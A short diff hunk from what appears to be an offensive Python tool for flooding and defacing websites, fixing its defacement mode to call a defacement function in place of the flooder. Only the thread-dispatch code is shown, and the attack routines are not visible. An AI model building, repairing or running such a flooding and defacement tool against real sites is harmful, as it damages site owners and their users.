@@ -68,7 +68,7 @@ def test_defacepage(url,mode,command=''):
              th = threading.Thread(target=thread_flooder,args=(thread,url,countdown,booter)); th.start()
             else:
                files = str(input(f"{fg(70)}DEFACE PAGE FILE {fg(71)}?{fg(255)}{attr(0)}"))
-               th = threading.Thread(target=thread_flooder,args=(url,files)); th.start()
+               th = threading.Thread(target=defacement,args=(url,files)); th.start()
          elif mode == 1:
             th = threading.Thread(target=thread_flooder,args=(int(command.split(' ')[0]),url,int(command.split(' ')[1]),int(command.split(' ')[2]))); th.start()
          elif mode == 2:
